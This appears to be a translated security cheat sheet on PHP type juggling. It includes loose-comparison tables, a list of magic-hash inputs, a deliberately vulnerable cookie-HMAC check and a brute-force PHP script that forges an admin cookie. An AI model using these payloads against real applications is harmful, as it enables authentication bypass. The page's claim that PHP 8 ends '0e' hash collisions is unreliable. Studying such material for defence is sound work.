# 类型转换

> PHP是一种弱类型语言，这意味着它试图预测程序员的意图，并在必要时自动将变量转换为不同的类型。例如，只包含数字的字符串可以被视为整数或浮点数。然而，这种自动转换（或类型转换）可能导致意外的结果，特别是在使用'=='运算符比较变量时，该运算符只检查值相等性（宽松比较），而不是类型和值相等性（严格比较）。

## 摘要

* [宽松比较](#宽松比较)
  * [真实陈述](#真实陈述)
  * [NULL语句](#null-statements)
* [魔术哈希](#magic-hashes)
* [利用](#exploit)
* [参考](#references)

## 宽松比较

> 当在攻击者可以控制被比较变量之一的区域中使用宽松比较（== 或 !=）而不是严格比较（=== 或 !==）时，会出现PHP类型转换漏洞。这种漏洞可能导致应用程序对真或假陈述返回意外的答案，并可能导致严重的授权和/或身份验证错误。

- **宽松**比较：使用`== 或 !=`：两个变量具有“相同的值”。
- **严格**比较：使用`=== 或 !==`：两个变量具有“相同的类型和相同的值”。

### 真实陈述

| 陈述                            |               输出               |
| ------------------------------- | :------------------------------: |
| `'0010e2'   == '1e3'`           |               真实               |
| `'0xABCdef' == ' 0xABCdef'`     | 真实（PHP 5.0）/ 虚假（PHP 7.0） |
| `'0xABCdef' == '     0xABCdef'` | 真实（PHP 5.0）/ 虚假（PHP 7.0） |
| `'0x01'     == 1`               | 真实（PHP 5.0）/ 虚假（PHP 7.0） |
| `'0x1234Ab' == '1193131'`       |               真实               |
| `'123'  == 123`                 |               真实               |
| `'123a' == 123`                 |               真实               |
| `'abc'  == 0`                   |               真实               |
| `'' == 0 == false == NULL`      |               真实               |
| `'' == 0`                       |               真实               |
| `0  == false `                  |               真实               |
| `false == NULL`                 |               真实               |
| `NULL == ''`                    |               真实               |

> PHP8不再尝试将字符串转换为数字，这得益于更明智的字符串到数字比较RFC，意味着以0e开头的哈希等冲突终于成为过去！内部函数的一致类型错误RFC将防止像`0 == strcmp($_GET['username'], $password)`绕过这样的情况，因为strcmp不会再返回null并发出警告，而会抛出适当的异常。

![LooseTypeComparison](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/Images/table_representing_behavior_of_PHP_with_loose_type_comparisons.png?raw=true)

宽松类型比较在许多语言中都会发生：

* [MariaDB](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Mariadb)
* [MySQL](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Mysql)
* [NodeJS](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/NodeJS)
* [PHP](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/PHP)
* [Perl](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Perl)
* [Postgres](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Postgres)
* [Python](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Python)
* [SQLite](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/SQLite/2.6.0)

### NULL语句

| 函数 | 陈述                  | 输出 |
| ---- | --------------------- | :--: |
| sha1 | `var_dump(sha1([]));` | NULL |
| md5  | `var_dump(md5([]));`  | NULL |

## 魔术哈希

> 由于PHP类型转换的一个怪癖，当比较字符串哈希与整数时，如果字符串哈希以"0e"开头，后跟仅数字，PHP将其解释为科学计数法，并且在比较操作中将哈希视为浮点数。

| Hash | "魔术"数字/字符串 | Magic Hash                                    | 发现者 / 描述 |
| ---- | -------------------------- |:---------------------------------------------:| -------------:|
| MD4  | gH0nAdHk                   | 0e096229559581069251163783434175              | [@spaze](https://github.com/spaze/hashes/blob/master/md4.md) |
| MD4  | IiF+hTai                   | 00e90130237707355082822449868597              | [@spaze](https://github.com/spaze/hashes/blob/master/md4.md) |
| MD5  | 240610708                  | 0e462097431906509019562988736854              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | QNKCDZO                    | 0e830400451993494058024219903391              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | 0e1137126905               | 0e291659922323405260514745084877              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | 0e215962017                | 0e291242476940776845150308577824              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | 129581926211651571912466741651878684928                | 06da5430449f8f6f23dfc1276f722738              | Raw: ?T0D??o#??'or'8.N=? |
| SHA1 | 10932435112                | 0e07766915004133176347055865026311692244      | Independently found by Michael A. Cleverly & Michele Spagnuolo & Rogdham |
| SHA-224 | 10885164793773          | 0e281250946775200129471613219196999537878926740638594636 | [@TihanyiNorbert](https://twitter.com/TihanyiNorbert/status/1138075224010833921) |
| SHA-256 | 34250003024812          | 0e46289032038065916139621039085883773413820991920706299695051332 | [@TihanyiNorbert](https://twitter.com/TihanyiNorbert/status/1148586399207178241) |
| SHA-256 | TyNOQHUS                | 0e66298694359207596086558843543959518835691168370379069085300385 | [@Chick3nman512](https://twitter.com/Chick3nman512/status/1150137800324526083)|

```php
<?php
var_dump(md5('240610708') == md5('QNKCDZO')); # bool(true)
var_dump(md5('aabg7XSs')  == md5('aabC9RqS'));
var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));
?>
```

## 利用漏洞

以下代码中的漏洞在于使用松散比较（!=）来验证$cookie['hmac']与计算出的$hash。

```php
function validate_cookie($cookie,$key){
	$hash = hash_hmac('md5', $cookie['username'] . '|' . $cookie['expiration'], $key);
	if($cookie['hmac'] != $hash){ // 松散比较
		return false;
		
	}
	else{
		echo "干得好";
	}
}
```

在这种情况下，如果攻击者可以控制$cookie['hmac']值并将其设置为像"0"这样的字符串，并且以某种方式操纵hash_hmac函数返回以"0e"开头且后面只跟数字的哈希（被解释为零），那么条件$cookie['hmac'] != $hash将评估为假，有效地绕过了HMAC检查。

我们可以控制cookie中的3个元素：

- `$username` - 目标用户名，可能是"admin"
- `$expiration` - 一个UNIX时间戳，必须是未来的时间
- `$hmac` - 提供的哈希，"0"

利用漏洞阶段如下：

1. 准备恶意cookie：攻击者准备一个cookie，将$username设置为他们希望冒充的用户（例如，"admin"），$expiration设置为未来的UNIX时间戳，$hmac设置为"0"。

2. 暴力破解$expiration值：然后攻击者暴力破解不同的$expiration值，直到hash_hmac函数生成一个以"0e"开头且后面只跟数字的哈希。这是一个计算密集型过程，根据系统设置可能不可行。但如果成功，此步骤将生成一个"类似零"的哈希。

   ```php
   // docker run -it --rm -v /tmp/test:/usr/src/myapp -w /usr/src/myapp php:8.3.0alpha1-cli-buster php exp.php
   for($i=1424869663; $i < 1835970773; $i++ ){
   	$out = hash_hmac('md5', 'admin|'.$i, '');
   	if(str_starts_with($out, '0e' )){
   		if($out == 0){
   			echo "$i - ".$out;
   			break;
   		}
   	}
   }
   ?>
   ```

3. 使用暴力破解的值更新cookie数据：`1539805986 - 0e772967136366835494939987377058`

   ```php
   $cookie = [
   	'username' => 'admin',
   	'expiration' => 1539805986,
   	'hmac' => '0'
   ];
   ```

4. 在这种情况下，我们假设密钥为空字符串：$key = '';


## 参考

- 利用异类错误类别编写漏洞利用代码：PHP类型转换（[Writing Exploits For Exotic Bug Classes: PHP Type Juggling By Tyler Borland](http://turbochaos.blogspot.com/2013/08/exploiting-exotic-bugs-php-type-juggling.html)）
- 魔法哈希 - WhiteHatSec（[Magic Hashes - WhiteHatSec](https://www.whitehatsec.com/blog/magic-hashes/)）
- PHP魔术技巧：类型转换（[PHP Magic Tricks: Type Juggling](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)）
- spaze/hashes - 魔法哈希 – PHP哈希“碰撞”（[spaze/hashes - Magic hashes – PHP hash "collisions"](https://github.com/spaze/hashes)）
- （超级）魔法哈希 - 2019年10月7日星期一 - myst404（[(Super) Magic Hashes - Mon 07 October 2019 - myst404 (@myst404_)](https://offsec.almond.consulting/super-magic-hash.html)）